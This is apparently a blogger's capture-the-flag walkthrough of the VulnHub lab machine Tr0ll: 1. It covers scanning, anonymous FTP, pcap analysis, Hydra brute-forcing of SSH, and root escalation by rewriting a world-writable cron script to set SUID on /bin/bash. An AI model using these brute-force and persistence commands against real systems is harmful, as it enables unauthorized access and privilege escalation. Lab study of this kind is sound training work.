# VulnHub - Tr0ll: 1 (Write-Up)

_6 min read · February 14, 2026 · by qs18_

---

## Entry Log

In this mini-blog, I’ll be showing you the walkthrough for [**Tr0ll: 1**](https://www.vulnhub.com/entry/tr0ll-1,100/) machine from [**VulnHub**](https://www.vulnhub.com/about/).

- Goal: Obtain `Proof.txt` in Root
- Difficulty: Easy
- Machine Author: Maleus

---

## Getting the Machine IP Address

As usual:

```bash
sudo netdiscover -i eth0 -r 192.168.11.0/24
```

In my case, the machine IP address is **192.168.11.140**.

## Scanning for Open Ports

Again as usual:

```bash
nmap -sS 192.168.11.140
sudo nmap -sCV -p 21,22,80 192.168.11.140
```

![Nmap Output](./img/vulnhub-troll1/Nmap-output.png)

From the scan result, I noticed that:

- FTP (port 21) is open and allows 'anonymous' login.
- SSH (port 22) is open.
- HTTP (port 80) is open and `robots.txt` is available.

Then as usual, I browsed the site first.

![Troll 1: Website](./img/vulnhub-troll1/web.png)

I also inspected the source code, but there was nothing useful there.

---

## Futher Enumeration on the Website

I accessed `robots.txt`.

```bash
User-agent:*
Disallow: /secret
```

Then I navigated to `/secret`.

![Troll 1: Web Secret](./img/vulnhub-troll1/web-secret.png)

I also inspected the source code there, but still nothing useful.

Next, I used [**Gobuster**](https://www.kali.org/tools/gobuster/) to further enumerate directories.

```bash
gobuster dir -u http://192.168.11.140 -w /usr/share/wordlists/dirb/common.txt
```

![Gobuster Output](./img/vulnhub-troll1/Gobuster-output.png)

I had visited all of it already. At this point, I decided to enumerate other services.

---

## Accessing the FTP

Since FTP allowed `anonymous` login.

```bash
ftp 192.168.11.140
anonymous
<enter>
ls
```

![FTP](./img/vulnhub-troll1/ftp.png)

Inside, I found a file named `lol.pcap`, so I downloaded it.

```bash
get lol.pcap
```

![lol.pcap Download](./img/vulnhub-troll1/pcap-downl.png)

I opened the `.pcap` file in [**Wireshark**](https://www.kali.org/tools/wireshark/) and followed a TCP stream.

![lol.pcap - 1](./img/vulnhub-troll1/pcap-1.png)

In here, I saw a `secret_stuff.txt` has been deleted.

![lol.pcap - 2](./img/vulnhub-troll1/pcap-2.png)

I also found this text. I noticed the word 'dir', which suggests that it might refer to a directory.

---

## Further Enumeration on the Website

I tried accessing the `sup3rs3cr3tdirlol` in the browser.

![Troll 1: Web supersecretdirlol](./img/vulnhub-troll1/web-supersecret.png)

Luckily I was right.

Then I downloaded `roflmao` and make it executable.

```bash
mv ../Downloads/roflmao .
chmod +x roflmao
```

Then I ran it.

```bash
./roflmao
```

```output
Find address 0x0856BF to proceed
```

Then I tried accessing it in the browser again.

![Troll 1: Web 0x0856BF](./img/vulnhub-troll1/web-0x.png)

---

## Finding the Password

Inside the `good_luck` directory, there was a file named `which_one_lol.txt` containing:

```bash
maleus
ps-aux
felux
Eagle11
genphlux < -- Definitely not this one
usmc8892
blawrg
wytshadow
vis1t0r
overflow
```

Inside the `this_folder_contains_the_password` directory, there was a file named `Pass.txt` containing only:

```bash
Good_job_:)
```

This might be the password for the list of words (or usernames) before. I then saved both of them.

Since I had already accessed FTP and there was no web login page, I decided to brute-force SSH using [**Hydra**](https://www.kali.org/tools/hydra/).

```bash
hydra -v -V -L user.txt -p "Good_job_:)" ssh://192.168.11.140
```

![Hydra - Failed 1](./img/vulnhub-troll1/Hydra-f1.png)

It failed.

Then I tried using the same list for both username and password.

```bash
hydra -v -V -L user.txt -P user.txt ssh://192.168.11.140
```

![Hydra Failed 2](./img/vulnhub-troll1/Hydra-f2.png)

It failed again and I got temporarily blocked from SSH.

Then I reconsidered the directory name which is `this_folder_contains_the_password`. Maybe the password is literally the filename itself.

```bash
hydra -v -V -L user.txt -p "Pass.txt" ssh://192.168.11.140
```

![Hydra - Success](./img/vulnhub-troll1/Hydra-s.png)

---

## Post-Exploitation Enumeration

I logged in to SSH:

```bash
ssh overflow@192.168.11.140
Pass.txt
```

After logging in, I performed my usual post-exploitation checklist.

I searched for world-writable files:

```bash
find / -perm -0002 -type f -xdev 2>/dev/null
```

- -0002 → World-writable.
- -xdev → Stay within the current filesystem.

![Find Results](./img/vulnhub-troll1/find-res.png)

I checked `cronlog`:

```bash
cat /var/log/cronlog
```

```output
*/2 * * * * cleaner.py
```

This means `cleaner.py` runs every 2 minutes via `cron`.

Then I checked `cleaner.py`:

```bash
cat /lib/log/cleaner.py
```

![cleaner.py Output](./img/vulnhub-troll1/erm.png)

It just deletes everything in `/tmp`.

If `cleaner.py` is world-writable and it is executed by root, then we can modify it to execute our own commands as root.

---

## Privilege Escalation

I modified `cleaner.py` and replaced the command inside `try` with:

```bash
os.system('chmod +s /bin/bash')
```

After waiting about 2 minutes for cron to execute it, I ran:

```bash
/bin/bash -p
```

Then I retrieved the flag.

![Flag](./img/vulnhub-troll1/flag.png)

---

## Session Terminated

Tr0ll: 1 is an easy machine that focuses heavily on enumeration, file analysis, and privilege escalation via misconfigured scheduled tasks. From this machine, I learned how to:

- extract useful information from captured TCP streams
- enumerate world-writable files using find
- exploit writable cron scripts for privilege escalation
- escalate privileges by modifying scripts executed as root

Thank you for reading and see you next time!
